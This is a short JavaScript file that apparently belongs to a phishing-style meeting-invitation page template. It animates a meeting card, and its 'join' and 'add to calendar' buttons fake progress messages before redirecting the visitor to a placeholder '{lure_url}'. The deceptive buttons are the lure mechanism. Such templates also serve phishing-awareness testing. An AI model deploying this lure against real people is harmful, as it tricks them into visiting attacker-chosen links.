function joinMeeting() {
    const btn = document.querySelector('.btn-join');
    btn.innerHTML = '<span>Connecting...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1500);
}

function addToCalendar() {
    const btn = document.querySelector('.btn-calendar');
    btn.innerHTML = '<span>Adding...</span>';
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1000);
}

document.addEventListener('DOMContentLoaded', () => {
    const card = document.querySelector('.meeting-card');
    card.style.opacity = '0';
    card.style.transform = 'scale(0.95)';
    
    setTimeout(() => {
        card.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
        card.style.opacity = '1';
        card.style.transform = 'scale(1)';
    }, 100);
});
